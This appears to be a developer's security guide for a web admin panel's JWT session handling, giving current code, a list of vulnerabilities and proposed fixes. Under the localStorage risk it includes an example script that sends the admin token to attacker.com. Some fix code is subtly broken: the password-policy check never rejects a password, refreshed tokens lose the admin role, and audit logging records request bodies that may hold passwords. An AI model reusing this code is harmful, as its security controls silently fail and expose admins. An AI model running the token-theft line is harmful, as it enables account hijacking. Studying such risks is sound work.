# Admin Panel Security & Session Management Guide

## Table of Contents
1. [Current Session Timeout Mechanism](#current-session-timeout-mechanism)
2. [Current Admin Panel Architecture](#current-admin-panel-architecture)
3. [Security Vulnerabilities](#security-vulnerabilities)
4. [How to Make Admin Panel More Secure](#how-to-make-admin-panel-more-secure)
5. [Implementation Guide](#implementation-guide)

---

## Current Session Timeout Mechanism

### How Session Timeout Works (Currently)

#### **Step 1: Login Process**
```javascript
// Backend: /backend/routes/auth.js (Lines 20-48)
router.post("/login", async (req, res) => {
  // 1. Check if user exists
  const user = await User.findOne({ email });
  
  // 2. Verify password with bcrypt
  const isMatch = await bcrypt.compare(password, user.password);
  
  // 3. Check if user is admin (STRICT CHECK)
  if (user.role !== 'admin') {
    return res.status(403).json({ message: "Access denied. Admin only." });
  }
  
  // 4. Create JWT token with 1-day expiration
  const token = jwt.sign(
    { id: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: "1d" }  // TOKEN EXPIRES IN 1 DAY
  );
  
  // 5. Send token to frontend
  res.json({
    token,
    role: user.role,
    name: user.name
  });
});
```

**Key Points:**
- Token expires in **24 hours** (`"1d"`)
- Uses JWT (JSON Web Token) for stateless authentication
- No refresh token mechanism (once expired, must re-login)

---

#### **Step 2: Frontend Token Storage**
```javascript
// Frontend: /frontend/sheildsupport/account.html
// After successful login:
localStorage.setItem("token", response.token);      // Token stored here
localStorage.setItem("role", response.role);        // Role stored
localStorage.setItem("name", response.name);        // Name stored
```

**Problem:** Tokens stored in `localStorage` are vulnerable to XSS (Cross-Site Scripting) attacks!

---

#### **Step 3: Session Check on Dashboard Load**
```javascript
// Frontend: /frontend/sheildsupport/admin/dashboard.html (Lines 1350-1390)

// On page load, checkAuth() is called
window.onload = async function() {
  if (await checkAuth()) {
    switchTab('dashboard');
  }
};

async function checkAuth() {
  const token = localStorage.getItem("token");
  
  // 1. Check if token exists
  if (!token) {
    alert("Please log in first");
    window.location.href = "../account.html";  // Redirect to login
    return false;
  }
  
  try {
    // 2. Verify token is still valid by calling /api/auth/me
    const res = await fetch(`${AUTH_API}/me`, { 
      headers: { "Authorization": "Bearer " + token } 
    });
    
    // 3. If token is expired or invalid (res.ok = false)
    if (!res.ok) {
      alert("Session expired. Please log in again.");
      localStorage.removeItem("token");      // Clear all tokens
      localStorage.removeItem("role");
      localStorage.removeItem("name");
      window.location.href = "../account.html";  // Redirect to login
      return false;
    }
    
    // 4. Verify user is still admin
    const user = await res.json();
    if (user.role !== 'admin') {
      alert("Access denied. Admin only.");
      window.location.href = "../account.html";
      return false;
    }
    
    return true;  // Session is valid
    
  } catch (error) {
    alert("Authentication error. Please log in again.");
    localStorage.clear();
    window.location.href = "../account.html";
    return false;
  }
}
```

**What Happens:**
1. ✅ User visits dashboard
2. ✅ `checkAuth()` checks if token exists in localStorage
3. ✅ Calls backend `/api/auth/me` to validate token
4. ✅ Backend uses JWT middleware to verify token signature
5. 🔴 If token expired → Backend returns 401 error
6. 🔴 Frontend detects 401 → Clears localStorage → Redirects to login

---

#### **Step 4: API Requests with Token**
```javascript
// Every API call includes the token
const res = await fetch(`${API}?limit=100`, { 
  headers: { "Authorization": "Bearer " + token }  // Token sent here
});
```

**Backend Middleware Checks Token:**
```javascript
// /backend/middleware/auth.js
module.exports = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ message: "Auth token missing" });
  }
  
  const token = authHeader.split(" ")[1];
  
  try {
    // JWT VERIFIES TOKEN SIGNATURE AND EXPIRATION
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    // Token expired or invalid
    return res.status(401).json({ message: "Invalid token" });
  }
};
```

---

### **Timeline: When Session Expires**

```
Day 1, 3:00 PM  → User logs in, token created with expiration = Day 2, 3:00 PM
Day 1, 3-11:59 PM → User can use dashboard, API calls work
Day 2, 3:00:01 PM → Token expires! jwt.verify() throws error
Day 2, 3:00:01 PM → Next API call fails with 401 error
Day 2, 3:00:01 PM → checkAuth() detects 401, shows "Session expired"
Day 2, 3:00:01 PM → localStorage cleared, user redirected to login
```

---

## Current Admin Panel Architecture

### **Frontend Structure**

#### **Dashboard HTML Structure**
```html
<!DOCTYPE html>
<html>
  <head>
    <script src="assets/js/config.js"></script>  <!-- API Base URL -->
  </head>
  <body>
    <!-- Sidebar Navigation -->
    <div class="sidebar">
      <nav class="navbar-nav">
        <a class="nav-item" id="nav-dashboard" onclick="switchTab('dashboard')">Dashboard</a>
        <a class="nav-item" id="nav-blogs" onclick="switchTab('blogs')">Blog Management</a>
        <a class="nav-item" id="nav-meetings" onclick="switchTab('meetings')">Meetings</a>
        <a class="nav-item" id="nav-subscribers" onclick="switchTab('subscribers')">Subscribers</a>
        <a class="nav-item" id="nav-messages" onclick="switchTab('messages')">Messages</a>
        <a class="nav-item" id="nav-careers" onclick="switchTab('careers')">Careers</a>
      </nav>
    </div>
    
    <!-- Main Content Area -->
    <div class="main-content">
      <!-- Each section is a separate tab -->
      <div id="dashboard-section" class="section active"><!-- Dashboard --></div>
      <div id="blogs-section" class="section"><!-- Blogs --></div>
      <div id="meetings-section" class="section"><!-- Meetings --></div>
      <!-- ... more sections ... -->
    </div>
  </body>
  
  <script>
    // API Configuration
    const API = `${AppConfig.API_BASE_URL}/api/blogs`;
    const AUTH_API = `${AppConfig.API_BASE_URL}/api/auth`;
    
    // State Management
    const token = localStorage.getItem("token");
    const role = localStorage.getItem("role");
    let allBlogs = [];
    let editingBlogId = null;
  </script>
</html>
```

### **Admin Panel Features & Functions**

#### **1. Dashboard Tab (Overview)**
```javascript
// Line 1400+
window.onload = async function() {
  if (await checkAuth()) {
    switchTab('dashboard');  // Load dashboard on startup
    updateStats(allBlogs);   // Show total blogs count
  }
};

function updateStats(blogs) {
  document.getElementById('totalBlogs').innerText = blogs.length;
}
```
**What it shows:**
- Total number of blogs
- Recent meetings
- Total subscribers
- Overview of system status

---

#### **2. Blog Management**
```javascript
// Blog Operations
async function fetchBlogs() {
  const res = await fetch(`${API}?limit=100`, { 
    headers: { "Authorization": "Bearer " + token } 
  });
  const data = await res.json();
  const blogs = data.blogs || [];
  allBlogs = blogs;
  renderBlogs(blogs);
}

function renderBlogs(blogs) {
  // Shows list of all blogs with options:
  // - View: Opens blog in new window
  // - Edit: Loads blog into editor
  // - Delete: Removes blog from database
}

function editBlog(id) {
  // Loads blog content into form with Quill editor
  // User can modify title, description, content, images, sections
}

async function handleBlogSubmit() {
  // POST request for new blogs
  // PUT request for updates
  // Sends FormData with files (main image + section images)
}

async function deleteBlog(id) {
  // DELETE request to remove blog
  if (!confirm("Delete this blog?")) return;
  const response = await fetch(`${API}/${id}`, {
    method: "DELETE",
    headers: { "Authorization": "Bearer " + token }
  });
}
```

**Features:**
- Create new blogs with rich text editor (Quill.js)
- Edit existing blogs
- Add multiple sections with images
- Delete blogs
- Upload images

---

#### **3. Meeting Management**
```javascript
// Load all scheduled meetings
function loadMeetings() {
  fetch(`${AppConfig.API_BASE_URL}/api/meetings`, {
    headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
  })
    .then(res => res.json())
    .then(data => {
      allMeetings = data;
      renderMeetingsTable(data);  // Display in table
      updateMeetingCount(data);    // Update stats
    });
}

function openMeetingModal(id) {
  // Shows detailed meeting information:
  // - Name, Email, Phone, Website
  // - Subject, Date, Time, Timezone
  // - Google Meet Link (if available)
  // - Admin notes/updates field
}

function saveMeetingUpdate(id) {
  // Admin can add notes to meetings
  // PUT request to update adminUpdate field
}

async function deleteMeeting(id) {
  // DELETE request to remove meeting
}
```

**Features:**
- View all meetings with client details
- See Google Meet links
- Add admin notes
- Delete meetings

---

#### **4. Subscriber Management**
```javascript
function loadSubscribers() {
  fetch(`${AppConfig.API_BASE_URL}/api/subscribers`)
    .then(res => res.json())
    .then(data => {
      // Shows table of all newsletter subscribers
      // Email, subscription date, delete option
    });
}

function deleteSubscriber(id) {
  // Remove subscriber from list
}
```

**Features:**
- View newsletter subscribers
- Delete subscribers
- See subscription date

---

#### **5. Message Management**
```javascript
async function fetchMessages() {
  const res = await fetch(`${AppConfig.API_BASE_URL}/api/messages`, { 
    headers: { "Authorization": "Bearer " + token } 
  });
  const messages = await res.json();
  renderMessages(messages);  // Show in table
}

function renderMessages(messages) {
  // Table shows:
  // - Date/Time received
  // - Sender name and email
  // - Subject
  // - Message preview
  // - Delete button
}

async function deleteMessage(id) {
  // DELETE request to remove message
}
```

**Features:**
- View all contact form submissions
- See sender details
- Delete messages

---

#### **6. Career/Job Posting Management**
```javascript
async function loadCareers() {
  const res = await fetch(`${AppConfig.API_BASE_URL}/api/careers`, { 
    headers: { "Authorization": "Bearer " + token } 
  });
  allCareers = await res.json();
  renderCareersAdmin(allCareers);
}

function editCareer(id) {
  // Load job details into form:
  // - Job title, department, work model, type
  // - Experience level, location
  // - Short description, full description (Quill editor)
  // - Apply email
}

async function handleCareerSubmit() {
  // POST for new job posting
  // PUT for updates
  // Sends job details to backend
}

async function deleteCareer(id) {
  // DELETE request to remove job posting
}
```

**Features:**
- Create job postings
- Edit job details
- Manage job status (active/closed)
- Delete postings

---

#### **7. Logout Function**
```javascript
function logout() {
  localStorage.clear();  // Clear all stored data (token, role, name)
  window.location.href = "../index.html";  // Redirect to home
}
```

---

### **Backend API Structure**

#### **Authentication Routes** (`/backend/routes/auth.js`)
```
POST   /api/auth/login      → Login with email/password, returns JWT token
GET    /api/auth/me         → Verify token and return user profile
POST   /api/auth/signup     → DISABLED (returns 403 error)
```

#### **Blog Routes** (`/backend/routes/blog.js`)
```
GET    /api/blogs           → Get all blogs with pagination
GET    /api/blogs/:id       → Get single blog by ID
POST   /api/blogs           → Create blog (admin + image upload)
PUT    /api/blogs/:id       → Update blog (admin only)
DELETE /api/blogs/:id       → Delete blog (admin only)
```

#### **Other Routes**
```
/api/meetings    → Meeting management
/api/subscribers → Newsletter subscribers
/api/messages    → Contact form messages
/api/careers     → Job postings
```

#### **Authentication Middleware** (`/backend/middleware/auth.js`)
- Verifies JWT token from Authorization header
- Extracts user ID and role from token
- Passes to next middleware if valid, returns 401 if not

#### **Admin Middleware** (`/backend/middleware/admin.js`)
- Chains auth middleware first
- Then checks if `user.role === 'admin'`
- Returns 403 if not admin

---

## Security Vulnerabilities

### 🔴 **Critical Vulnerabilities**

#### **1. Token Stored in localStorage (XSS Risk)**
**Current Code:**
```javascript
localStorage.setItem("token", response.token);
```

**Why it's dangerous:**
- localStorage is vulnerable to XSS attacks
- Malicious JavaScript can steal the token
- Attacker can impersonate admin if XSS is exploited

**Example Attack:**
```javascript
// Malicious script injected into page
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

**Risk Level:** 🔴 CRITICAL

---

#### **2. No Inactivity Timeout**
**Current Behavior:**
- Token valid for 24 hours regardless of activity
- If admin leaves browser tab open, anyone can access it

**Example Scenario:**
```
3:00 PM: Admin logs in at office
3:15 PM: Admin steps away from desk for 1 hour
4:15 PM: Attacker sits at unattended computer
4:15 PM: Dashboard still shows admin is logged in
4:15 PM: Attacker can create/modify/delete blogs!
```

**Risk Level:** 🔴 CRITICAL

---

#### **3. No Refresh Token**
**Current Problem:**
- If token expires during work session, lose all data
- No way to automatically refresh token
- User must re-login and lose current work

**Risk Level:** 🟡 HIGH

---

#### **4. No Rate Limiting on Login**
**Current Code:**
```javascript
router.post("/login", async (req, res) => {
  // No rate limit! Can try unlimited passwords
  const user = await User.findOne({ email });
  const isMatch = await bcrypt.compare(password, user.password);
});
```

**Attack Scenario:**
```
Attacker tries: admin@company.com + password1
Attacker tries: admin@company.com + password2
Attacker tries: admin@company.com + password3
... (no limit, continues forever)
```

**Risk Level:** 🟡 HIGH

---

#### **5. No Input Validation**
**Current Code:**
```javascript
router.post("/login", async (req, res) => {
  const { email, password } = req.body;
  // No validation! Can cause injection attacks
  const user = await User.findOne({ email });
});
```

**Risk Level:** 🟡 HIGH

---

### 🟡 **Important Issues**

#### **6. No CSRF Protection**
- Cross-site requests could perform admin actions
- No verification that request came from actual admin

#### **7. No Audit Logging**
- Can't track who modified what
- No security event history

#### **8. No Content Security Policy**
- Missing HTTP headers for security
- Doesn't prevent XSS attacks

#### **9. Password Policy Not Enforced**
- No minimum length
- No complexity requirements
- No password change history

---

## How to Make Admin Panel More Secure

### **Priority 1: Critical Fixes (Implement First)**

#### **1.1: Switch from localStorage to httpOnly Cookies**

**Why:** httpOnly cookies can't be accessed by JavaScript, preventing XSS theft

**Backend Changes:**

```javascript
// /backend/routes/auth.js

router.post("/login", async (req, res) => {
  // ... existing validation code ...
  
  const token = jwt.sign(
    { id: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: "1d" }
  );
  
  // Instead of sending token in JSON response:
  // OLD: res.json({ token, role: user.role, name: user.name });
  
  // NEW: Set httpOnly cookie
  res.cookie("authToken", token, {
    httpOnly: true,      // Can't be accessed by JavaScript
    secure: true,        // Only sent over HTTPS
    sameSite: 'strict',  // Prevents CSRF attacks
    maxAge: 24 * 60 * 60 * 1000  // 1 day
  });
  
  // Still send role and name (not sensitive)
  res.json({
    success: true,
    role: user.role,
    name: user.name
  });
});
```

**Frontend Changes:**

```javascript
// /frontend/sheildsupport/admin/dashboard.html

// OLD CODE (DELETE):
// const token = localStorage.getItem("token");

// NEW CODE:
// Token is now in httpOnly cookie, sent automatically!
// No need to get it from localStorage

async function checkAuth() {
  try {
    // Cookie sent automatically in request
    const res = await fetch(`${AUTH_API}/me`, {
      credentials: 'include'  // Include cookies in request
    });
    
    if (!res.ok) {
      alert("Session expired. Please log in again.");
      window.location.href = "../account.html";
      return false;
    }
    
    const user = await res.json();
    if (user.role !== 'admin') {
      alert("Access denied. Admin only.");
      window.location.href = "../account.html";
      return false;
    }
    
    return true;
  } catch (error) {
    window.location.href = "../account.html";
    return false;
  }
}

// Update all fetch calls to include credentials:
async function fetchBlogs() {
  const res = await fetch(`${API}?limit=100`, {
    credentials: 'include'  // Add this to every request
  });
  // ... rest of code
}

// Remove all localStorage.getItem("token") calls
// Replace with credentials: 'include' in all fetch requests
```

---

#### **1.2: Add Inactivity Timeout**

**Frontend Changes:**

```javascript
// /frontend/sheildsupport/admin/dashboard.html

// Add this after the checkAuth function:

let inactivityTimer;
const INACTIVITY_TIMEOUT = 30 * 60 * 1000;  // 30 minutes

function resetInactivityTimer() {
  // Clear existing timer
  if (inactivityTimer) {
    clearTimeout(inactivityTimer);
  }
  
  // Set new timer
  inactivityTimer = setTimeout(() => {
    alert("⏱️ Your session has expired due to inactivity. Please log in again.");
    logout();
  }, INACTIVITY_TIMEOUT);
}

// Reset timer on user activity
document.addEventListener('mousedown', resetInactivityTimer);
document.addEventListener('keydown', resetInactivityTimer);
document.addEventListener('click', resetInactivityTimer);
document.addEventListener('scroll', resetInactivityTimer);

// Start timer when page loads
window.addEventListener('load', () => {
  resetInactivityTimer();
});
```

**What this does:**
- 30 minutes of no activity → auto-logout
- Any mouse click, key press, or scroll resets the timer
- User sees warning before logout

---

#### **1.3: Add Rate Limiting**

**Install package:**
```bash
cd backend
npm install express-rate-limit
```

**Backend Changes:**

```javascript
// /backend/routes/auth.js

const rateLimit = require("express-rate-limit");
const express = require("express");

// Create rate limiter for login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minute window
  max: 5,                     // Max 5 attempts per window
  message: "Too many login attempts. Please try again later.",
  standardHeaders: true,      // Return rate limit info in headers
  legacyHeaders: false,       // Disable X-RateLimit-* headers
});

// Apply to login route
router.post("/login", loginLimiter, async (req, res) => {
  // ... existing login code ...
});

module.exports = router;
```

**What this does:**
- Max 5 login attempts per 15 minutes
- Blocks IP address after 5 failed attempts
- Prevents brute force password guessing

---

### **Priority 2: Important Fixes (Implement Next)**

#### **2.1: Add Input Validation**

**Install package:**
```bash
npm install express-validator
```

**Backend Changes:**

```javascript
// /backend/routes/auth.js

const { body, validationResult } = require("express-validator");

router.post("/login", 
  // Validation middleware
  body('email')
    .isEmail()
    .withMessage('Invalid email format')
    .normalizeEmail(),
  body('password')
    .isLength({ min: 6 })
    .withMessage('Password must be at least 6 characters'),
  
  // Check validation results
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // ... existing login code ...
  }
);
```

---

#### **2.2: Add Refresh Token System**

**Database Change:**

```javascript
// /backend/models/User.js

const UserSchema = new Schema({
  // ... existing fields ...
  refreshToken: {
    type: String,
    default: null
  }
});
```

**Backend Changes:**

```javascript
// /backend/routes/auth.js

router.post("/login", async (req, res) => {
  // ... existing validation ...
  
  const accessToken = jwt.sign(
    { id: user._id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: "15m" }  // Short-lived access token
  );
  
  const refreshToken = jwt.sign(
    { id: user._id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: "7d" }  // Long-lived refresh token
  );
  
  // Store refresh token in database
  user.refreshToken = refreshToken;
  await user.save();
  
  // Set httpOnly cookies
  res.cookie("accessToken", accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000  // 15 minutes
  });
  
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  res.json({ success: true, role: user.role, name: user.name });
});

// Add refresh endpoint
router.post("/refresh", (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
    
    // Create new access token
    const newAccessToken = jwt.sign(
      { id: decoded.id, role: decoded.role },
      process.env.JWT_SECRET,
      { expiresIn: "15m" }
    );
    
    res.cookie("accessToken", newAccessToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });
    
    res.json({ success: true });
  } catch (err) {
    res.status(401).json({ message: "Invalid refresh token" });
  }
});
```

**Frontend Changes:**

```javascript
// /frontend/sheildsupport/admin/dashboard.html

// Auto-refresh token before expiration
setInterval(async () => {
  try {
    const res = await fetch(`${AUTH_API}/refresh`, {
      method: "POST",
      credentials: 'include'
    });
    
    if (res.ok) {
      console.log("Token refreshed automatically");
    } else {
      console.log("Token refresh failed, redirecting to login");
      window.location.href = "../account.html";
    }
  } catch (error) {
    console.error("Refresh failed:", error);
  }
}, 10 * 60 * 1000);  // Every 10 minutes (before 15 minute expiration)
```

---

#### **2.3: Add Audit Logging**

**Create new model:**

```javascript
// /backend/models/AuditLog.js

const mongoose = require("mongoose");

const AuditLogSchema = new mongoose.Schema({
  adminId: mongoose.Schema.Types.ObjectId,
  adminEmail: String,
  action: String,  // e.g., "BLOG_CREATE", "BLOG_UPDATE", "BLOG_DELETE"
  resource: String,  // e.g., "Blog", "Meeting"
  resourceId: String,
  details: mongoose.Schema.Types.Mixed,
  ipAddress: String,
  userAgent: String,
  timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

module.exports = mongoose.model("AuditLog", AuditLogSchema);
```

**Add logging middleware:**

```javascript
// /backend/middleware/auditLog.js

const AuditLog = require("../models/AuditLog");

module.exports = async (req, res, next) => {
  // Log after request completes
  const originalSend = res.send;
  
  res.send = function(data) {
    // Only log successful requests
    if (res.statusCode === 200 || res.statusCode === 201) {
      AuditLog.create({
        adminId: req.user?.id,
        adminEmail: req.user?.email,
        action: `${req.method}_${req.path}`,
        ipAddress: req.ip,
        userAgent: req.get('user-agent'),
        details: {
          method: req.method,
          path: req.path,
          body: req.body
        }
      }).catch(err => console.error("Audit log failed:", err));
    }
    
    originalSend.call(this, data);
  };
  
  next();
};
```

**Use in routes:**

```javascript
// /backend/routes/blog.js

const auditLog = require("../middleware/auditLog");

// Log all blog operations
router.use(auditLog);

router.post("/", auth, admin, upload.any(), async (req, res) => {
  // Blog creation logged automatically
});
```

---

### **Priority 3: Nice-to-Have Improvements**

#### **3.1: Add Content Security Policy**

```javascript
// /backend/server.js

app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com"
  );
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("X-XSS-Protection", "1; mode=block");
  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  next();
});
```

---

#### **3.2: Add Password Policy**

```javascript
// /backend/routes/auth.js or /backend/scripts/create_admin.js

function validatePassword(password) {
  const requirements = {
    length: password.length >= 12,
    uppercase: /[A-Z]/.test(password),
    lowercase: /[a-z]/.test(password),
    number: /[0-9]/.test(password),
    special: /[!@#$%^&*]/.test(password)
  };
  
  return requirements;
}

// When creating/updating admin:
if (!validatePassword(password)) {
  return res.status(400).json({ 
    message: "Password must be 12+ characters with uppercase, lowercase, number, and special character" 
  });
}
```

---

#### **3.3: Add Session Management UI**

```javascript
// /frontend/sheildsupport/admin/dashboard.html

function showSessionWarning() {
  const checkInterval = setInterval(() => {
    const remaining = Math.floor(getRemainingSessionTime() / 60);
    
    if (remaining > 0 && remaining <= 5) {
      showNotification(
        `⚠️ Session expiring in ${remaining} minute${remaining > 1 ? 's' : ''}`,
        'warning'
      );
    }
  }, 60000);  // Check every minute
}

function getRemainingSessionTime() {
  // Implementation depends on how you track login time
  const loginTime = localStorage.getItem('loginTime');
  const elapsed = Date.now() - loginTime;
  const remaining = (24 * 60 * 60 * 1000) - elapsed;  // 24 hours
  return remaining;
}

function showNotification(message, type) {
  const notification = document.createElement('div');
  notification.className = `notification notification-${type}`;
  notification.innerHTML = message;
  document.body.appendChild(notification);
  
  setTimeout(() => notification.remove(), 5000);
}
```

---

## Implementation Guide

### **Phase 1: Immediate Security (Day 1-2)**
1. ✅ Switch to httpOnly cookies
2. ✅ Add inactivity timeout
3. ✅ Add rate limiting

### **Phase 2: Core Security (Day 3-4)**
1. ✅ Input validation
2. ✅ Refresh token system
3. ✅ Audit logging

### **Phase 3: Polish (Day 5+)**
1. ✅ CSP headers
2. ✅ Password policy
3. ✅ Session management UI

---

## Testing Checklist

- [ ] Login works with new cookie system
- [ ] Token expires in 15 minutes (access token)
- [ ] Token auto-refreshes before expiration
- [ ] 5 failed logins blocks IP for 15 minutes
- [ ] Logout clears all cookies
- [ ] No activity for 30 minutes logs out user
- [ ] All API calls include credentials
- [ ] Invalid input is rejected with error
- [ ] Audit logs created for all admin actions
- [ ] No tokens visible in browser localStorage
- [ ] XSS attack cannot steal token

---

## Env Variables Needed

Add to `.env`:
```
JWT_SECRET=your_existing_secret
JWT_REFRESH_SECRET=generate_new_random_secret_here
```

---

## Summary

**Current State:**
- ❌ Tokens in localStorage (XSS risk)
- ❌ 24-hour sessions (inactivity risk)
- ❌ No rate limiting (brute force risk)
- ❌ No input validation (injection risk)

**After Implementation:**
- ✅ httpOnly cookies (XSS safe)
- ✅ 30-minute inactivity timeout
- ✅ 5 attempts per 15 minutes rate limit
- ✅ Full input validation
- ✅ Audit trail of all actions
- ✅ Auto-token refresh system

This will make your admin panel **significantly more secure** against common web attacks!

